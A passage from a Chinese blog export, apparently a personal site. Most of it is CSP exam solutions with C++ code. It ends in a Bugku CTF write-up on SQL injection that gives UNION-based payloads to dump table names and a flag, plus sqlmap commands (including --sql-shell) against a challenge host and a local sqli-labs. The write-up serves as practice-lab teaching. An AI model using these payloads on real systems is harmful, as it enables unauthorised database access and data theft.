行，每行包含一个字符串，字符串由大小写英文字母组成，不含空格和其他字符。\n\n输出格式\n\n输出多行，每行包含一个字符串，按出现的顺序依次给出那些包含了字符串 S 的行。\n\n样例输入\n\nHello1  \n5HelloWorldHiHiHelloHiHiGrepIsAGreatToolHELLOHELLOisNOTHello\n\n样例输出\n\nHelloWorldHiHiHelloHiHiHELLOisNOTHello\n\n样例说明\n\n在上面的样例中，第四个字符串虽然也是 Hello，但是大小写不正确。如果将输入的第二行改为 0，则第四个字符串应该输出。\n\n评测用例规模与约定\n\n1&lt;=n&lt;=100，每个字符串的长度不超过 100。\n\n解题思路\n如果大小写不敏感的话，就把S和T全都转成小写字母再比较。\n参考代码\n1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;algorithm&gt;using namespace std;string S;int flag;int n;int main()&#123;    cin &gt;&gt; S &gt;&gt; flag &gt;&gt; n;    if(flag == 0)        transform(S.begin(),S.end(),S.begin(),::tolower);    string T,tmp;    while(n--)    &#123;        cin &gt;&gt; T;        tmp.resize(T.size());        if(flag == 0)            transform(T.begin(),T.end(),tmp.begin(),::tolower);        else tmp = T;        if(tmp.find(S,0) != string::npos) cout &lt;&lt; T &lt;&lt; endl;    &#125;    return 0;&#125;\n\n部分代码解释：\ntransform(S.begin(),S.end(),S.begin(),::tolower)：第一个参数是源容器的起始地址 ，第二个参数是源容器的终止地址 ，第三个参数是目标容器的起始地址，第四个参数是函数指针。另外，在#include &lt;cctype&gt;中也有tolower()函数，用法是str[i] = tolower(str[i]);。之所以要加一个tmp，是因为tmp是转换为小写后的，但是输出还是要原来转换前的。C++ 中 find () 函数用法：(1) 头文件#include &lt;algorithm&gt;，返回值是目标元素的下标，找不到时返回值为迭代器结尾12string = \"hello\";find(s.begin(), s.end(), 'o') == s.end()\n\n​        (2) 头文件#include &lt;string&gt;\n123456789string str1, str2;char c;str1.find(str2);//从串str1中查找时str2，返回str2中首个字符在str1中的地址\tstr1.find(str2,5);//从str1的第5个字符开始查找str2str1.find(c);//在str1中查找字符o并返回第一个查找到的地址str1.find(\"str2\",2 , 2);//从str1中的第二个字符开始查找of big的前两个字符\n\n查找字符串 a 是否包含子串 b 不是用 strA.find (strB) &gt; 0 而是 strA.find (strB) != string:npos，条件成立就是含有子串。201312-4 有趣的数问题描述\n\n我们把一个数称为有趣的，当且仅当：\n它的数字只包含 0, 1, 2, 3，且这四个数字都出现过至少一次。所有的 0 都出现在所有的 1 之前，而所有的 2 都出现在所有的 3 之前。最高位数字不为 0。因此，符合我们定义的最小的有趣的数是 2013。除此以外，4 位的有趣的数还有两个：2031 和 2301。请计算恰好有 n 位的有趣的数的个数。由于答案可能非常大，只需要输出答案除以 1000000007 的余数。\n\n输入格式\n\n输入只有一行，包括恰好一个正整数 n (4 ≤ n ≤ 1000)。\n\n输出格式\n\n输出只有一行，包括恰好 n 位的整数中有趣的数的个数除以 1000000007 的余数。\n\n样例输入\n\n4\n\n样例输出\n\n3\n\n解题思路\n\n动态规划思想。通过分析得知，第 1 位数字必是 2，前 i 位的数字组成有以下 6 种情况：\n0、只包含 21、只包含 2、02、只包含 2、33、只包含 2、0、14、只包含 2、0、35、只包含 2、0、1、3 \n且第 i+1 位数字的取法与前 i 位有关。我们设 dp[i][j] 表示前 i 位数字是由第 j 种情况组成的有趣的数的个数，那么可以得到 dp[i]与 dp[i-1] 的递推式：\n dp[i][0]=1 （前 i-1 位全为 2，那么第 i 位在情况 0 下只能取 2，且只有 1 种）dp[i][1]=dp[i-1][0]+dp[i-1][1]*2（若前 i-1 位由 2 组成，那么第 i 位只能取 0 以满足情况 1；若前 i-1 位由 2、0 组成，那么第 i 位在情况 1 下可以取 2 或 0。以下类似）dp[i][2]=dp[i-1][0]+dp[i-1][2]dp[i][3]=dp[i-1][1]+dp[i-1][3]*2dp[i][4]=dp[i-1][1]+dp[i-1][2]+dp[i-1][4]*2dp[i][5]=dp[i-1][3]+dp[i-1][4]+dp[i-1][5]*2\n\n参考代码\n123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;#define MAXN 1002typedef long long LL;const int mod = 1000000007;LL dp[MAXN][6];int n;int main()&#123;    cin &gt;&gt; n;    for(int i = 1;i &lt;= n;i++)    &#123;        dp[i][0] = 1;        dp[i][1] = (dp[i-1][0] + dp[i-1][1]*2) % mod;        dp[i][2] = (dp[i-1][0] + dp[i-1][2]) % mod;        dp[i][3] = (dp[i-1][1] + dp[i-1][3]*2) % mod;        dp[i][4] = (dp[i-1][1] + dp[i-1][2] + dp[i-1][4]*2) % mod;        dp[i][5] = (dp[i-1][3] + dp[i-1][4] + dp[i-1][5]*2) % mod;    &#125;    cout &lt;&lt; dp[n][5];    return 0;&#125;\n\n","thumbnail":"https://i.loli.net/2020/01/21/3IHaWncu64zsPBo.jpg","plink":"https://yuyuoo.github.io/2020/02/10/csp刷题笔记（第3-4题）/"},{"title":"csp刷题笔记（第1-2题）","date":"2020-02-10T06:47:30.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"updated":"2020-09-10T03:06:16.152Z","content":"202006-1 线性分类器题目\n\n\n\n解题思路\n给每个点设置一个rtype，将点的坐标直接代入线的式子，大于0rtype就是A，否则rtype就是B。在判断是否每个type相同的点rtype也相同时，将每个点与它的前一个点比较。\n参考代码\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;#define MAXN 1005struct Node&#123;    int x,y;    char type,rtype;&#125;;struct Line&#123;    int th0,th1,th2;&#125;;int Judge(struct Node n1,struct Node n2)&#123;    if(n1.type == n2.type &amp;&amp; n1.rtype == n2.rtype)    &#123;        return 1;    &#125;    else if (n1.type != n2.type &amp;&amp; n1.rtype != n2.rtype)    &#123;        return 1;    &#125;    else    &#123;        return 0;    &#125;&#125;int main()&#123;    int n,m;    cin &gt;&gt; n &gt;&gt; m;    struct Node node[MAXN];    struct Line line[m];    for(int i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; node[i].x;        cin &gt;&gt; node[i].y;        cin &gt;&gt; node[i].type;    &#125;    int flag = 1;    for(int i = 0;i &lt; m;i++)    &#123;        flag = 1;        cin &gt;&gt; line[i].th0;        cin &gt;&gt; line[i].th1;        cin &gt;&gt; line[i].th2;        for(int j = 0;j &lt; n;j++)        &#123;            if(line[i].th0 + line[i].th1 * node[j].x + line[i].th2 * node[j].y &gt; 0)            &#123;                node[j].rtype = 'A';            &#125;            else node[j].rtype = 'B';                        if(j &gt; 0)            &#123;                flag = Judge(node[j-1],node[j]);    //跟前一个点判断是否符合规则            &#125;            if(flag == 0)            &#123;                cout &lt;&lt; \"No\\n\";                break;            &#125;        &#125;        if(flag == 1)            cout &lt;&lt; \"Yes\" &lt;&lt; endl;    &#125;&#125;\n\n202006-2 稀疏向量题目\n\n\n解题思路\n只需用一个vector存储第一个稀疏向量，第二个稀疏向量边输入边判断。\n参考代码\n123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;utility&gt;using namespace std;int main()&#123;    int n, a, b, index, value;    long long inner_product = 0;    cin &gt;&gt; n &gt;&gt; a &gt;&gt; b;    vector&lt;pair&lt;int, int&gt;&gt;v1;    for (int i = 0; i &lt; a; i++)    &#123;        cin &gt;&gt; index &gt;&gt; value;        v1.push_back(make_pair(index, value));    &#125;    int j = 0;    for (int i = 0; i &lt; b; i++)    &#123;        cin &gt;&gt; index &gt;&gt; value;        while(j &lt; a)        &#123;            if (v1[j].first &gt; index)\t\t                break;            else if (v1[j].first &lt; index)\t\t                j++;            else            &#123;                inner_product += value * (v1[j].second);                j++;            &#125;        &#125;    &#125;    cout &lt;&lt; inner_product &lt;&lt; endl;    return 0;&#125;\n\n部分用法解释：\npair&lt;int, int&gt;：pair 是将 2 个数据组合成一组数据，两个值可以分别用 pair 的两个公有函数 first 和 second 访问。定义 (构造函数)：1234567pair&lt;T1, T2&gt; p1;            //创建一个空的pair对象（使用默认构造），它的两个元素分别是T1和T2类型，采用值初始化。pair&lt;T1, T2&gt; p1(v1, v2);    //创建一个pair对象，它的两个元素分别是T1和T2类型，其中first成员初始化为v1，second成员初始化为v2。make_pair(v1, v2);          // 以v1和v2的值创建一个新的pair对象，其元素类型分别是v1和v2的类型。p1 &lt; p2;                    // 两个pair对象间的小于运算，其定义遵循字典次序：如 p1.first &lt; p2.first 或者 !(p2.first &lt; p1.first) &amp;&amp; (p1.second &lt; p2.second) 则返回true。p1 == p2；                  // 如果两个对象的first和second依次相等，则这两个对象相等；该运算使用元素的==操作符。p1.first;                   // 返回对象p1中名为first的公有数据成员p1.second;                 // 返回对象p1中名为second的公有数据成员s\n\n\n201912-1 报数题目\n\n甲乙丙丁决定玩一个报数的游戏来打发时间。游戏规则为四个人从 1 开始轮流进行报数，但如果需要报出的数是 7 的倍数或含有数字 7 则直接跳过。\n此外大家约定，在总共报出了 n 个数后（不计入被跳过的数）游戏结束。现在需要你来帮忙统计，游戏过程中每个人各自跳过了几次。\n\n输入\n\n从标准输入读入数据。\n输入仅一行，包含一个正整数 n，表示报出了多少个数后游戏结束。\n\n输出\n\n输出到标准输出。\n输出共四行，每行一个整数，依次表示甲乙丙丁四人在游戏过程中跳过的次数。\n\n输入样例 1\n\n20\n\n输出样例 1\n\n2  \n11  \n0\n\n样例解释 1\n\n报数过程为：\n甲：1，乙：2，丙：3，丁：4甲：5，乙：6，丙：跳过，丁：8甲：9，乙：10，丙：11，丁：12甲：13，乙：跳过，丙：15，丁：16甲：跳过，乙：18，：19，丁：20甲：跳过，乙：22，丙：23，丁：24在丁报出 24 后，四个人总计报出了 20 个数，游戏结束。\n\n输入样例 2\n\n66\n\n输出样例 2\n\n7  \n5115\n\n提示\n\n测试点 1、2、3、4 和 5，保证 n&lt;=10^2；测试点 6、7、8、9 和 10，保证 n&lt;=666。\n\n解题思路\n之所以先写这道题目是因为，在12月的考试中看测试点犯了错。这里的n是指报出了多少个数，并不是说数到666，所以在报数过程中百位是可能出现7的，事实上会一直报到四位数。所以可以只判断3位（不会上七千+），但一定要判断百位是否为7 。\n参考代码\n12345678910111213141516171819202122232425262728293031323334353637 #include&lt;iostream&gt;using namespace std;int main()&#123;\tint n;\tcin&gt;&gt;n;\tint i,j,k;\tint count[4];\t\t//记录甲乙丙丁各跳了多少个\tfor(i = 0;i &lt; 4;i++)\t&#123;\t\tcount[i] = 0;\t&#125;\ti = 1;\tj = 1;\twhile(j &lt;= n)\t&#123;\t\tif(i % 7 == 0)\t\t\tcount[(i-1)%4]++;\t\telse if(i % 100 == 7)\t\t\tcount[(i-1)%4]++;\t\telse if(i % 100 % 10 == 7)\t\t\tcount[(i-1)%4]++;\t\telse if(i / 10 % 10 == 7)\t\t\tcount[(i-1)%4]++;\t\telse if(i/100 == 7)\t\t\tcount[(i-1)%4]++;\t\telse j++;\t\ti++;\t&#125;\t\tfor(j = 0;j &lt; 4;j++)\t&#123;\t\tcout&lt;&lt;count[j]&lt;&lt;endl;\t&#125;\treturn 0;\t&#125;\n\n201903-1 小中大题目\n\n老师给了你 n 个整数组成的测量数据，保证有序（可能为升序或降序），可能存在重复的数据。请统计出这组测量数据中的最大值、中位数以及最小值，并按照从大到小的顺序输出这三个数。\n\n输入\n\n从标准输入读入数据。\n第一行输入一个整数 n，在第二行中存在 n 个有序的整数，表示测量数据，可能为升序或降序排列，可能存在连续多个整数相等，整数与整数之间使用空格隔开。\n\n输出\n\n输出到标准输出。\n包含一行，包括最大值、中位数以及最小值共三个数，并按照从大到小的顺序输出。数据与数据之间使用空格隔开。对于整数请直接输出整数，对于可能出现的分数，请输出四舍五入保留 1 位小数的结果。\n\n解题思路\n\n因为中位数可能要输出一位小数，中位数mid设置成double，判断mid-int(mid)是否等于0，不等于就要输出一位小数。\n\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include&lt;iostream&gt;using namespace std;int main()&#123;    int n;    cin &gt;&gt; n;    int num[n];    for(int i=0;i &lt; n;i++)    &#123;        cin&gt;&gt;num[i];    &#125;    if(num[2] &gt;= num[1])    //升序    &#123;        cout&lt;&lt;num[n-1]&lt;&lt;\" \"; //最大数        if(n % 2 == 1)  //奇数        &#123;            cout&lt;&lt;num[n/2]&lt;&lt;\" \";        &#125;        else        &#123;            double mid = (num[n/2] + num[n/2-1])*1.0/2;            if((mid-int(mid)) == 0) //是整数            &#123;                cout&lt;&lt;(int)mid&lt;&lt;\" \";            &#125;            else            &#123;                printf(\"%.1f \",mid);            &#125;        &#125;        cout&lt;&lt;num[0];    &#125;    else    &#123;        cout&lt;&lt;num[0]&lt;&lt;\" \";        if(n % 2 == 1)  //奇数        &#123;            cout&lt;&lt;num[n/2]&lt;&lt;\" \";        &#125;        else        &#123;            double mid = (num[n/2] + num[n/2-1])*1.0/2;            if((mid-int(mid)) == 0) //是整数            &#123;                cout&lt;&lt;(int)mid&lt;&lt;\" \";            &#125;            else            &#123;                printf(\"%.1f \",mid);            &#125;        &#125;        cout&lt;&lt;num[n-1]&lt;&lt;\" \";    &#125;    return 0;&#125;\n\n201903-2 二十四点题目\n\n 定义每一个游戏由 4 个从 1-9 的数字和 3 个四则运算符组成，保证四则运算符将数字两两隔开，不存在括号和其他字符，运算顺序按照四则运算顺序进行。其中加法用符号 + 表示，减法用符号 - 表示，乘法用小写字母 x 表示，除法用符号 / 表示。在游戏里除法为整除，例如 2 / 3 = 0，3 / 2 = 1, 4 / 2 = 2。\n 老师给了你 n 个游戏的解，请你编写程序验证每个游戏的结果是否为 24 。\n\n输入\n\n从标准输入读入数据。第一行输入一个整数 n，从第 2 行开始到第 n + 1 行中，每一行包含一个长度为 7的字符串，为上述的 24 点游戏，保证数据格式合法。\n\n输出\n\n输出到标准输出。\n包含 n 行，对于每一个游戏，如果其结果为 24 则输出字符串 Yes，否则输出字符串 No。\n\n输入样例\n\n109+3+4x35+4x5x57-9-9+85x6/5x43+5+7+91x1+9-91x9-5/98/5+6x96x7-3x66x4+4/5\n\n输出样例\n\nYesNoNoYesYesNoNoNoYesYes\n\n解题思路\n用两个栈，一个存放数字，一个存放符号。减法运算为了方便，在入栈时把转变成加法运算，乘除法因为优先级高且从左到右，所以在数字入栈前就先计算结果，直接将结果写入栈。最终式子全部入栈后，符号栈事实上只存放了加号，最后依次出栈进行加法运算即可。\n参考代码\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include&lt;iostream&gt;#include&lt;stack&gt;#include&lt;cstring&gt;using namespace std;int main()&#123;    stack&lt;int&gt; num;    stack&lt;char&gt; sign;    int n;    cin &gt;&gt; n;    cin.get(); //读取留在缓冲区的换行符    char formula[10];    for(int i = 0;i &lt; n;i++)    &#123;    \tmemset(formula, 0, sizeof(formula));        cin.getline(formula,10);   //读取整个式子        while(!num.empty()) num.pop();\t//清空栈\t\twhile(!sign.empty()) sign.pop();        int j = 0;        while(j &lt; strlen(formula))        &#123;            if(formula[j] &gt; '0' &amp;&amp; formula[j] &lt;= '9')    //数字            &#123;                num.push(formula[j] - '0');                j++;            &#125;            else if(formula[j] == '+')  //加号            &#123;                sign.push('+');                j++;            &#125;            else if(formula[j] == '-')  //减号            &#123;                sign.push('+');                int tmp = (formula[j+1] - '0') * (-1);                num.push(tmp);                j+=2;            &#125;            else            &#123;                if(formula[j] == 'x')   //乘号                &#123;                    int tmp = num.top() * (formula[j+1] - '0');                    num.pop();                    num.push(tmp);                    j+=2;                &#125;                else    //除号                &#123;                    int tmp = num.top() / (formula[j+1] - '0');                    num.pop();                    num.push(tmp);                    j+=2;                &#125;            &#125;        &#125;                while(!sign.empty())        &#123;            sign.pop();            int a = num.top();            num.pop();            int b = num.top();            num.pop();            int c = a + b;            num.push(c);        &#125;        int ans = num.top();        if(ans == 24)        &#123;            cout&lt;&lt;\"Yes\\n\";        &#125;        else        &#123;            cout&lt;&lt;\"No\\n\";        &#125;    &#125;    return 0;&#125;\n\n这题如果用python写就非常简单，使用 eval 函数，将字符串作为 Python 的一条语句来执行，达到计算表达式的目的。\n①表达式中的乘法符号为小写字母 &quot;x&quot;，需要将其替换为 &quot;*&quot;\n②在 Python 中，&quot;/&quot; 表示浮点数除法，&quot;//&quot; 才表示整数向下取整，题意为后者\n③Python 的 input () 函数返回的是一个字符串，需要手动转化为 int 类型\n④利用 Python 的三目运算符可以简化代码\n1234n = int(input())for i in range(n):    str = input().replace('x', '*').replace('/', '//')    print(\"Yes\" if eval(str) == 24 else \"No\")\n\n201809-2 买菜题目\n\n小 H 和小 W 来到了一条街上，两人分开买菜，他们买菜的过程可以描述为，去店里买一些菜然后去旁边的一个广场把菜装上车，两人都要买 n 种菜，所以也都要装 n 次车。具体的，对于小 H 来说有 n 个不相交的时间段 [a1,b1],[a2,b2]…[an,bn] 在装车，对于小 W 来说有 n 个不相交的时间段 [c1,d1],[c2,d2]…[cn,dn] 在装车。其中，一个时间段 [s, t] 表示的是从时刻 s 到时刻 t 这段时间，时长为 t-s。\n由于他们是好朋友，他们都在广场上装车的时候会聊天，他们想知道他们可以聊多长时间。\n\n输入\n\n输入的第一行包含一个正整数 n，表示时间段的数量。接下来 n 行每行两个数 ai，bi，描述小 H 的各个装车的时间段。接下来 n 行每行两个数 ci，di，描述小 W 的各个装车的时间段。\n\n输出\n\n输出一行，一个正整数，表示两人可以聊多长时间。\n\n输入样例\n\n4  \n1 35 69 1314 152 45 710 1113 14\n\n输出样例\n\n3\n\n数据规模和约定\n\n对于所有的评测用例，1 ≤ n ≤ 2000, ai &lt; bi &lt; ai+1，ci &lt; di &lt; ci+1, 对于所有的 i (1 ≤ i ≤ n) 有，1 ≤ ai, bi, ci, di ≤ 1000000。\n\n解题思路\n\n在坐标轴上表示两个时间段的关系，有六种情况。\n\n参考代码\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include&lt;iostream&gt;using namespace std;#define MAXN 2005struct DURATION&#123;    int s,t;&#125;dura1[MAXN],dura2[MAXN];int main()&#123;    int n;    cin &gt;&gt; n;    int i,j;    for(i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; dura1[i].s &gt;&gt; dura1[i].t;    &#125;    for(i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; dura2[i].s &gt;&gt; dura2[i].t;    &#125;    i = 0;    j = 0;    int time = 0;    while(i &lt; n &amp;&amp; j &lt; n)    &#123;        if(dura1[i].t &lt;= dura2[j].s)        &#123;            i++;            continue;        &#125;        else if(dura1[i].s &lt; dura2[j].s &amp;&amp; dura1[i].t &lt; dura2[j].t)        &#123;            time += dura1[i].t - dura2[j].s;            i++;            continue;        &#125;        else if(dura1[i].s &gt;= dura2[j].s &amp;&amp; dura1[i].t &lt;= dura2[j].t)        &#123;            time += dura1[i].t - dura1[i].s;            i++;            continue;        &#125;        else if(dura2[j].t &lt;= dura1[i].s)        &#123;            j++;            continue;        &#125;        else if(dura2[j].s &lt; dura1[i].s &amp;&amp; dura2[j].t &lt; dura1[i].t)        &#123;            time += dura2[j].t - dura1[i].s;            j++;            continue;        &#125;        else if(dura2[j].s &gt;= dura1[i].s &amp;&amp; dura2[j].t &lt;= dura1[i].t)        &#123;            time += dura2[j].t - dura2[j].s;            j++;            continue;        &#125;    &#125;    cout &lt;&lt; time;    return 0;&#125;\n\n代码解释：\n第一种情况画在坐标轴上是\n  第二种情况是\n\n  那么在判断第一种情况时用dura1[i].t &lt;= dura2[j].s，判断第二种情况可以用dura1[i].s &lt; dura2[j].s &amp;&amp; dura1[i].t &lt; dura2[j].t &amp;&amp; dura1[i].t &gt; dura2[i].s，也可以是\n  dura1[i].s &lt; dura2[j].s &amp;&amp; dura1[i].t &lt; dura2[j].t， 但是如果按照前者提交上去显示运行超时，所以能不判断的条件就不要判断。\n201512-2 消除类游戏问题描述\n\n消除类游戏是深受大众欢迎的一种游戏，游戏在一个包含有 n 行 m 列的游戏棋盘上进行，棋盘的每一行每一列的方格上放着一个有颜色的棋子，当一行或一列上有连续三个或更多的相同颜色的棋子时，这些棋子都被消除。当有多处可以被消除时，这些地方的棋子将同时被消除。现在给你一个 n 行 m 列的棋盘，棋盘中的每一个方格上有一个棋子，请给出经过一次消除后的棋盘。请注意：一个棋子可能在某一行和某一列同时被消除。\n\n输入格式\n\n输入的第一行包含两个整数 n, m，用空格分隔，分别表示棋盘的行数和列数。接下来 n 行，每行 m 个整数，用空格分隔，分别表示每一个方格中的棋子的颜色。颜色使用 1 至 9 编号。\n\n输出格式\n\n输出 n 行，每行 m 个整数，相邻的整数之间使用一个空格分隔，表示经过一次消除后的棋盘。如果一个方格中的棋子被消除，则对应的方格输出 0，否则输出棋子的颜色编号。\n\n样例输入\n\n4 52 2 3 1 23 4 5 1 42 3 2 1 32 2 2 4 4\n\n样例输出\n\n2 2 3 0 23 4 5 0 42 3 2 0 30 0 0 4 4\n\n样例说明\n\n棋盘中第 4 列的 1 和第 4 行的 2 可以被消除，其他的方格中的棋子均保留。\n\n样例输入\n\n4 52 2 3 1 23 1 1 1 12 3 2 1 32 2 3 3 3\n\n样例输出\n\n2 2 3 0 23 0 0 0 02 3 2 0 32 2 0 0 0  \n\n样例说明\n\n棋盘中所有的 1 以及最后一行的 3 可以被同时消除，其他的方格中的棋子均保留。\n\n评测用例规模与约定\n\n所有的评测用例满足：1 ≤ n, m ≤ 30。\n\n解题思路\nleft[][]的值记录当前位置是从左数第多少个相同的数字，up[][]的值记录是从上往下数第多少个相同的数字，这样遍历left[][]和up[][]时往左和往上找，将重复数字消掉。\n比较特殊的是，这个消除游戏即使有横向竖向交叉，每条线上也必须至少有三个以上重复数字才会被消除。\n参考代码\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;using namespace std;#define MAXN 35int main()&#123;    int n,m;    cin &gt;&gt; n &gt;&gt;m;    int board[MAXN][MAXN];    int left[MAXN][MAXN];    int up[MAXN][MAXN];    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            cin &gt;&gt; board[i][j];            left[i][j] = up[i][j] = 1;            if(j &gt; 0 &amp;&amp; board[i][j] == board[i][j-1])                left[i][j] = left[i][j-1] + 1;            if(i &gt; 0 &amp;&amp; board[i][j] == board[i-1][j])                up[i][j] = up[i-1][j] + 1;        &#125;    &#125;    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)        &#123;            if(left[i][j] &gt;= 3)            &#123;                for(int k = 0;k &lt;left[i][j];k++)                    board[i][j-k] = 0;            &#125;            if(up[i][j] &gt;= 3)            &#123;                for(int k = 0;k &lt; up[i][j];k++)                    board[i-k][j] = 0;            &#125;        &#125;    &#125;    for(int i = 0;i &lt; n;i++)    &#123;        for(int j = 0;j &lt; m;j++)            cout &lt;&lt; board[i][j] &lt;&lt;\" \";        cout &lt;&lt; endl;    &#125;    return 0;&#125;\n\n201503-2 数字排序问题描述\n\n 给定 n 个整数，请统计出每个整数出现的次数，按出现次数从多到少的顺序输出。\n\n输入格式\n\n输入的第一行包含一个整数 n，表示给定数字的个数。\n第二行包含 n 个整数，相邻的整数之间用一个空格分隔，表示所给定的整数。\n\n输出格式\n\n 输出多行，每行包含两个整数，分别表示一个给定的整数和它出现的次数。按出现次数递减的顺序输出。如果两个整数出现的次数一样多，则先输出值较小的，然后输出值较大的。\n\n样例输入\n\n125 2 3 3 1 3 4 2 5 2 3 5\n\n样例输出\n\n3 42 35 31 14 1\n\n评测用例规模与约定\n\n 1 ≤ n ≤ 1000，给出的数都是不超过 1000 的非负整数。\n\n解题思路\n用结构体存每个数字和对应的次数，在结构体中写重载小于号的函数，因为后面直接调用algorithm里面的sort()函数，默认是从小到大排序，所以需要自己定义排序方式，次数相同时返回数值小的，否则返回次数多的。\n在新建结构体数组的时候，num[i].count就都是0，不用自己初始化。\n参考代码\n12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;algorithm&gt;#define MAXN 1005using namespace std;struct Num&#123;    int value;    int count;    bool operator &lt; (const Num &amp;rhs) const&#123;        if(count == rhs.count)  return value &lt; rhs.value;        return count &gt; rhs.count;    &#125;&#125;num[MAXN];int main()&#123;    int n,d,cnt=0;  //cnt记录有多少个不同的数字    cin &gt;&gt; n;    for(int i = 0;i &lt; n;i++)    &#123;        cin &gt;&gt; d;        if(num[d].count == 0)        &#123;            num[d].value = d;            cnt++;        &#125;        num[d].count++;    &#125;    sort(num,num + MAXN);    for(int i = 0;i &lt; cnt;i++)    &#123;        cout &lt;&lt; num[i].value &lt;&lt; \" \" &lt;&lt; num[i].count &lt;&lt; endl;    &#125;    return 0;&#125;\n\n201409-2 画图问题描述\n\n在一个定义了直角坐标系的纸上，画一个 (x1,y1) 到 (x2,y2) 的矩形指将横坐标范围从 x1 到 x2，纵坐标范围从 y1 到 y2 之间的区域涂上颜色。下图给出了一个画了两个矩形的例子。第一个矩形是 (1,1) 到 (4, 4)，用绿色和紫色表示。第二个矩形是 (2, 3) 到 (6, 5)，用蓝色和紫色表示。图中，一共有 15 个单位的面积被涂上颜色，其中紫色部分被涂了两次，但在计算面积时只计算一次。在实际的涂色过程中，所有的矩形都涂成统一的颜色，图中显示不同颜色仅为说明方便。\n\n给出所有要画的矩形，请问总共有多少个单位的面积被涂上颜色。\n\n输入格式\n\n输入的第一行包含一个整数 n，表示要画的矩形的个数。接下来 n 行，每行 4 个非负整数，分别表示要画的矩形的左下角的横坐标与纵坐标，以及右上角的横坐标与纵坐标。\n\n输出格式\n\n输出一个整数，表示有多少个单位的面积被涂上颜色。\n\n样例输入\n\n2  \n1 1 4 42 3 6 5\n\n样例输出\n\n15\n\n评测用例规模与约定\n\n1&lt;=n&lt;=100，0&lt;= 横坐标、纵坐标 &lt;=100。\n\n参考代码\n12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;set&gt;#include &lt;utility&gt;using namespace std;set&lt; pair&lt;int,int&gt; &gt;pot;int main()&#123;    int n;    cin &gt;&gt; n;    int x1,x2,y1,y2;    while(n--)    &#123;        cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;        for(int i = x1;i &lt; x2;i++)        &#123;            for(int j = y1;j &lt; y2;j++)            &#123;                pot.insert(make_pair(i,j));            &#125;        &#125;    &#125;    cout &lt;&lt; pot.size();    return 0;&#125;\n\n部分代码解释：\n容器set的头文件是#include &lt;set&gt;，是“集合”，所以自动给加入的坐标去重了容器pair的头文件是#include &lt;utility&gt;在数方格个数的时候，给的是两角的坐标，只要for循环中是i &lt; x2和j &lt; y2，就可以数出正确的个数。","thumbnail":"https://s2.ax1x.com/2020/01/19/1CU6pD.jpg","plink":"https://yuyuoo.github.io/2020/02/10/csp刷题笔记（第1-2题）/"},{"title":"ctf-web-WriteUp-2-Asuri-Bugku","date":"2020-02-10T06:39:32.000Z","date_formatted":{"ll":"Feb 10, 2020","L":"02/10/2020","MM-DD":"02-10"},"updated":"2020-05-29T15:22:56.635Z","content":"成绩单\n所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。    —— [百度百科]\n\n网页链接存在参数传递，后台并没有对用户的输入进行过滤，导致用户的输入直接被 SQL 解释器执行。SQL 注入的产生条件：\n有参数传递参数值带入数据库查询并且执行基础知识：https://blog.csdn.net/song_lee/article/details/80971459\nhttps://blog.csdn.net/qq_33530840/article/details/82144515\n当我们不知道数据库名，表名字段名时，需要去爆库，原理其实就是 MySQL 版本大于 5.0 时，有个默认数据库 information_schema，里面存放着所有数据库的信息 (比如表名、 列名、对应权限等)，通过这个数据库，我们就可以跨库查询，爆表爆列。\n爆库的标准姿势：\n12345select schema_name from information_schema.schemata;     //猜数据库select table_name from information_schema.tables where table_schema='xxxxx';     //猜某数据库的数据表Select column_name from information_schema.columns where table_name='xxxxx';     //猜某表的字段名\n\n这里可以从 post 数据包中注入，输入1号，用burpsuite抓包，点击 action——&gt;  copy to file。\n保存文件后打开sqlmap（我用的是虚拟机的），输入\n1sqlmap -r “/home/yuyu/桌面/ctf/题目/list2.txt” -p id --current-db\n\n\n\n\n\n\n得到当前使用数据库名字skctf_flag。爆表\n1sqlmap -r \"/home/yuyu/桌面/ctf/题目/list2.txt\" -p id --table -D \"skctf_flag\n\n\n\n\n\n\n爆 f14g 的列的时候找不到column，f14g这里的东西被删了，继续不下去了。\n网上还有几种别的方法，一是手动注入：\n123爆表：-1&#39; union select 1,table_name,3,4 from information_schema.tables where TABLE_SCHEMA&#x3D;&#39;skctf_flag&#39; LIMIT 0,1爆字段：-1&#39; union select 1,column_name,3,4 from information_schema.columns where TABLE_SCHEMA&#x3D;&#39;skctf_flag&#39; and table_name&#x3D;&#39;fl4g&#39; LIMIT 0,1#爆 flag：-1&#39; union select 1,skctf_flag,3,4 from fl4g#\n\n二是不抓包，拿到shell，\n1python2 sqlmap.py -u http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;chengjidan&#x2F;index.php --data &quot;id&#x3D;1&quot; --sql-shell\n\n\n一些常用使用命令\n\n1、是否能注入\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot;\n\n2、获取所有的数据库\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs\n\n3、当前库\n1python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --current-db\n\n4、查询某数据库的所有表（比如 